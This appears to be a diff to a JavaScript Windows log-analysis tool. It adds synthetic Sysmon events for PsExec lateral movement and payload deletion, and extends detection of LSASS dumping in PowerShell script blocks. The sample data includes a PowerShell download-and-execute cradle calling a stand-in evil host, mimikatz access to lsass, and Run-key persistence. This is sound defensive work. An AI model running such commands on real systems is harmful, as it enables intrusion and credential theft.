@@ -5135,6 +5135,10 @@ function buildSampleEvents(){
   sys.push(ev(SYS,SYSP,13,WS,"Microsoft-Windows-Sysmon/Operational",{TargetObject:"HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\Updater",Details:"C:\\Temp\\evil.exe",Image:"C:\\Temp\\evil.exe",EventType:"SetValue"},414));
   sys.push(ev(SYS,SYSP,10,WS,"Microsoft-Windows-Sysmon/Operational",{SourceImage:"C:\\Temp\\mimikatz.exe",TargetImage:"C:\\Windows\\System32\\lsass.exe",GrantedAccess:"0x1010",SourceUser:"CORP\\mallory",CallTrace:"UNKNOWN(...)"},416));
   sys.push(ev(SYS,SYSP,8,WS,"Microsoft-Windows-Sysmon/Operational",{SourceImage:"C:\\Temp\\evil.exe",TargetImage:"C:\\Windows\\System32\\lsass.exe",StartFunction:"LoadLibrary",User:"CORP\\mallory"},417));
+  // --- lateral movement: PsExec service named pipe (Sysmon 17) ---
+  sys.push(ev(SYS,SYSP,17,FS,"Microsoft-Windows-Sysmon/Operational",{PipeName:"\\PSEXESVC-WS07-8842-stdin",Image:"C:\\Windows\\PSEXESVC.exe",User:"CORP\\mallory"},426));
+  // --- anti-forensics: attacker wipes the dropped payload (Sysmon 23 FileDelete) ---
+  sys.push(ev(SYS,SYSP,23,WS,"Microsoft-Windows-Sysmon/Operational",{TargetFilename:"C:\\Temp\\evil.exe",Image:"C:\\Temp\\evil.exe",User:"CORP\\mallory"},464));
   // --- PowerShell script-block logging ---
   ps.push(ev(PS,PSP,4104,WS,"Microsoft-Windows-PowerShell/Operational",{ScriptBlockText:"IEX (New-Object Net.WebClient).DownloadString('http://download.evil.example.com/p.ps1')",Path:""},402));
   ps.push(ev(PS,PSP,4104,WS,"Microsoft-Windows-PowerShell/Operational",{ScriptBlockText:"$d=[Convert]::FromBase64String($e); [Reflection.Assembly]::Load($d)",Path:""},403));
@@ -7737,7 +7741,8 @@ function buildEvidence(){
         if(LSASS_DUMP.test(cmd)) E.lsassAccess.push({i,src:U("Image")||cmd.slice(0,90),ga:"process dump",user:U("User"),ts:r.ts,via:"process"});
         addProcArtifacts(i,cmd,U("User"),r.ts); }
         const h=U("Hashes"); if(h)h.split(",").forEach(x=>{x=x.trim();if(x)E.hashes.add(x);}); } break;
-      case "4104": { const sb=U("ScriptBlockText"); if(sb&&sb.length>3)E.psBlocks.push({i,text:sb,ts:r.ts}); break; }
+      case "4104": { const sb=U("ScriptBlockText"); if(sb&&sb.length>3)E.psBlocks.push({i,text:sb,ts:r.ts});
+        if(sb&&LSASS_DUMP.test(sb)) E.lsassAccess.push({i,src:"PowerShell: "+sb.slice(0,80),ga:"script-block dump",user:"",ts:r.ts,via:"powershell"}); break; }
       case "7045": E.services.push({i,name:U("ServiceName"),path:U("ImagePath"),start:U("StartType"),ts:r.ts}); break;
       case "4697": E.services.push({i,name:U("ServiceName"),path:U("ServiceFileName"),ts:r.ts}); break;
       case "4698": case "4702": case "4699": case "4700": case "4701": {
